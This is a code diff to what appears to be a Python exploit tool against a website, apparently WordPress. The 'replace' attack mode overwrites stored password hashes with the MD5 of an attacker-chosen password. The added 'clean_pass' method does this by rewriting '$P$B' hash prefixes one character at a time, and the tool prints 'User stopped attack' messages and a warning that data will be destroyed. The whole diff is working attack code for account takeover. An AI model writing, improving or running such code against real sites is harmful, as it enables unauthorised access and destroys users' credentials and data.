@@ -4,6 +4,8 @@ import optparse,sys
 import time
 import hashlib
 
+FAST = False
+
 class Target(object):
 	"""The target to overwrite"""
 	def __init__(self, url):
@@ -35,16 +37,19 @@ class Target(object):
 
 		if method == "replace":
 			self.PASSWORD_HASH = hashlib.md5(self.password).hexdigest()
-			Target.info("Most user data (including current password and email) will be \x1B[91mdestroyed\x1B[0m")
+			Target.info("Some data including old passwords will be \x1B[91mdestroyed\x1B[0m")
 			Target.info("\x1B[33mYou have 10 seconds to cancel\x1B[0m")
 			try:
 				time.sleep(10)
 			except:
 				Target.bad("User stopped attack. Leaving...")
 				exit(0)
-			self.keep_user()
-			self.attack_password()
-			self.place_user()
+			if FAST:
+				self.keep_user()
+				self.attack_password()
+				self.place_user()
+			else:
+				self.clean_pass()
 
 		elif method == "reset":
 			Target.good("Getting a new email")
@@ -114,6 +119,19 @@ class Target(object):
 		Target.good("Placing '"+self.password+"' as password")
 		for x in reversed(range(15,35)):
 			self.replace('1'*x,self.PASSWORD_HASH)
+
+	def clean_pass(self):
+		Target.good("Using the password-only replacement")
+		Target.info("This is the cleanest, but longest method!")
+
+		for x in self.ALPHABET:
+			self.replace("$P$B"+x,'$P$B$')
+
+		for x in range(0,34):
+			Target.info(str(x+1)+"/"+str(29))
+			for x in self.ALPHABET:
+				self.replace("$P$B$"+x,'$P$B$')
+		self.replace("$P$B$",self.PASSWORD_HASH)
 
 	def keep_user(self):
 		Target.good("Saving user '"+self.user+"'")
